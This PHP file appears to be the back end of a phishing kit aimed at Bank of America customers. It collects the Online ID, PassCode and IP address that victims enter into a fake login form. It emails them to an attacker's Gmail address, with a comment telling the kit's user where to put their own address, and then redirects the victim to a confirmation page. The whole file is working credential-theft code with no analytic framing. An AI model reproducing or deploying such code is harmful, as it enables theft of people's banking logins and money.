<?php
$ip = getenv("REMOTE_ADDR");
$message .= "+############### xSmayer ##############+\n";
$message .= "+############################################+\n";
$message .= "Online ID            : ".$_POST['formtext1']."\n";
$message .= "PassCode            : ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "+############### xSmayer ##############+\n";
//Change Your Email Here 
$send = "ayersshanna99@gmail.com";
$subject = "BOA LOG LOADING 50% : $ip"; 
$headers = "From: xSmayer<customer@xblack.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$praga=rand();
$praga=md5($praga);
header("Location: confirm.html");

	 
?>